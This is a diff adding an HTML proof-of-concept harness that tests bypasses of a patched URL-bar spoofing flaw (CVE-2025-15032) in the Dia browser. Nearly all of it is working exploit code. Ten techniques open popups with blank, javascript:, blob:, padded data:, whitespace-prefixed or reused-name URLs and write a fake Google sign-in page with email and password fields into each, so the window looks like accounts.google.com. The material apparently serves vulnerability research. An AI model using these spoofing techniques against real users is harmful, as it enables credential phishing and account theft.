@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Dia CVE-2025-15032 — about:blank fix bypass PoC</title>
+<style>
+  body{font-family:system-ui,Segoe UI,Arial;margin:24px;max-width:880px;line-height:1.45}
+  h1{font-size:18px} h2{font-size:14px;margin-top:22px}
+  button{display:block;width:100%;text-align:left;margin:6px 0;padding:10px 12px;border:1px solid #ccc;border-radius:8px;background:#fafafa;cursor:pointer;font-size:13px}
+  button:hover{background:#eef}
+  code{background:#f3f3f3;padding:1px 4px;border-radius:4px}
+  #log{white-space:pre-wrap;background:#111;color:#0f0;padding:10px;border-radius:8px;font-family:ui-monospace,Consolas;font-size:12px;min-height:60px}
+  .note{color:#666;font-size:12px}
+</style>
+</head>
+<body>
+<h1>Dia CVE-2025-15032 — bypass test harness</h1>
+<p class="note">Target spoof domain shown in each opened window: <b>accounts.google.com</b>.
+For each technique below, click it in <b>Dia ≥ 1.9.0</b> and inspect the <b>opened window's URL bar</b>.
+<br>✅ <b>BYPASS</b> = URL bar is <b>empty</b> or shows something other than <code>about:blank</code>, while the page looks like the trusted domain.
+<br>❌ <b>fix held</b> = URL bar shows <code>about:blank</code>.</p>
+
+<h2>0. Control (the original CVE — should now show about:blank)</h2>
+<button onclick="t_control()">window.open() — no URL (original bug, fixed in 1.9.0)</button>
+
+<h2>Bypass candidates</h2>
+<button onclick="t_empty()">A. window.open('') — empty-string instead of no-arg</button>
+<button onclick="t_resubsequent()">B. open a real doc, THEN navigate it to about:blank (subsequent nav)</button>
+<button onclick="t_js()">C. window.open('javascript:…') — javascript: URL</button>
+<button onclick="t_query()">D. window.open('about:blank?…') — query suffix</button>
+<button onclick="t_hash()">E. window.open('about:blank#…') — fragment suffix</button>
+<button onclick="t_ws()">F. window.open(' \t about:blank') — leading whitespace / control chars</button>
+<button onclick="t_race()">G. open about:blank + immediate stop()+write (race the URL commit)</button>
+<button onclick="t_blob()">H. window.open(blob:…) — blob URL, custom size</button>
+<button onclick="t_data()">I. window.open('data:…') padded with newlines (push visible chars)</button>
+<button onclick="t_reopen()">J. open named window, then re-open about:blank into same name</button>
+<button onclick="t_all()">▶︎ Run A–J sequentially (watch each window)</button>
+
+<div id="log"></div>
+
+<script>
+const FEAT = 'width=720,height=480,left=140,top=140,menubar=no,location=yes,status=no';
+const DOMAIN = 'accounts.google.com';
+function log(m){ const l=document.getElementById('log'); l.textContent += m + '\n'; }
+
+// Spoofed content written into the opened blank window.
+function spoof(w, label){
+  if(!w){ log('  ['+label+'] window.open returned null (popup blocked?)'); return; }
+  try{
+    const html =
+      '<!doctype html><html><head><meta charset="utf-8">' +
+      '<title>'+DOMAIN+'</title></head>' +
+      '<body style="font-family:system-ui;margin:0">' +
+      '<div style="background:#fff;border-bottom:1px solid #eee;padding:14px 20px;font-size:20px;color:#5f6368">Google</div>' +
+      '<div style="max-width:380px;margin:48px auto;text-align:center">' +
+      '<h2 style="font-weight:400">Sign in</h2><p style="color:#5f6368">Use your Google Account</p>' +
+      '<input placeholder="Email or phone" style="width:90%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:6px">' +
+      '<input type="password" placeholder="Password" style="width:90%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:6px">' +
+      '<div style="text-align:right;width:95%"><button style="background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:6px">Next</button></div>' +
+      '<hr><p style="color:#b00;font-size:12px">[PoC '+label+'] If the URL bar above is EMPTY or NOT "about:blank", this is a CVE-2025-15032 fix bypass.</p>' +
+      '</div></body></html>';
+    w.document.open(); w.document.write(html); w.document.close();
+    try{ w.document.title = DOMAIN; }catch(e){}
+    log('  ['+label+'] wrote spoof of "'+DOMAIN+'" — CHECK the new window\'s URL bar.');
+  }catch(e){ log('  ['+label+'] write failed: '+e); }
+}
+
+// 0 — control: original bug
+function t_control(){ log('0/control window.open()'); spoof(window.open('', '_blank', FEAT.replace('location=yes','')), 'control'); }
+
+// A — empty string argument (may take a different code path than no-arg)
+function t_empty(){ log('A empty-string'); spoof(window.open('', '_blank', FEAT), 'A empty'); }
+
+// B — open a committed (non-blank) doc, then navigate it back to about:blank (subsequent nav)
+function t_resubsequent(){
+  log('B subsequent-nav-to-blank');
+  const w = window.open('data:text/html,<title>loading</title><h3>loading…</h3>', '_blank', FEAT);
+  setTimeout(()=>{ try{ w.location.href = 'about:blank'; }catch(e){ log('  loc set err '+e); }
+    setTimeout(()=>spoof(w,'B subsequent'), 120); }, 200);
+}
+
+// C — javascript: URL (resulting document derives from about:blank)
+function t_js(){
+  log('C javascript:');
+  const w = window.open("javascript:'<html><head></head><body></body></html>'", '_blank', FEAT);
+  setTimeout(()=>spoof(w,'C javascript:'), 150);
+}
+
+// D / E — blank-equivalent URLs the fix may not normalize
+function t_query(){ log('D about:blank?'); spoof(window.open('about:blank?'+Date.now(), '_blank', FEAT), 'D query'); }
+function t_hash(){  log('E about:blank#'); spoof(window.open('about:blank#'+Date.now(), '_blank', FEAT), 'E hash'); }
+
+// F — leading whitespace / control characters (browsers strip them; spoof-check may not)
+function t_ws(){ log('F whitespace'); spoof(window.open('\t\n about:blank', '_blank', FEAT), 'F whitespace'); }
+
+// G — race: write before the about:blank URL is committed to the omnibox
+function t_race(){
+  log('G race-write');
+  const w = window.open('about:blank', '_blank', FEAT);
+  try{ w.stop && w.stop(); }catch(e){}
+  // write immediately, then again on next frames, to beat the URL-commit
+  spoof(w,'G race(0)');
+  requestAnimationFrame(()=>{ try{ w.document.title=DOMAIN; }catch(e){} });
+}
+
+// H — blob: URL window
+function t_blob(){
+  log('H blob:');
+  const b = new Blob(['<title>'+DOMAIN+'</title><body>blob</body>'], {type:'text/html'});
+  const u = URL.createObjectURL(b);
+  const w = window.open(u, '_blank', FEAT);
+  setTimeout(()=>spoof(w,'H blob'), 200);
+}
+
+// I — data: URL padded with leading newlines so the visible part of the omnibox is blank-ish
+function t_data(){
+  log('I data: padded');
+  const pad = '\n'.repeat(40);
+  const w = window.open('data:text/html,'+encodeURIComponent(pad+'<title>'+DOMAIN+'</title><h3>x</h3>'), '_blank', FEAT);
+  setTimeout(()=>{ try{ w.document.title=DOMAIN; }catch(e){} log('  [I] check if omnibox visibly empty (data: scrolled off)'); }, 200);
+}
+
+// J — open a named window with content, then re-open about:blank into the SAME name
+function t_reopen(){
+  log('J reopen-into-name');
+  window.open('data:text/html,<title>seed</title>', 'spoofwin', FEAT);
+  setTimeout(()=>{ const w = window.open('about:blank', 'spoofwin', FEAT); setTimeout(()=>spoof(w,'J reopen'),120); }, 200);
+}
+
+function t_all(){
+  const seq=[t_empty,t_resubsequent,t_js,t_query,t_hash,t_ws,t_race,t_blob,t_data,t_reopen];
+  let i=0; (function nxt(){ if(i<seq.length){ seq[i++](); setTimeout(nxt,900); } })();
+}
+</script>
+</body>
+</html>
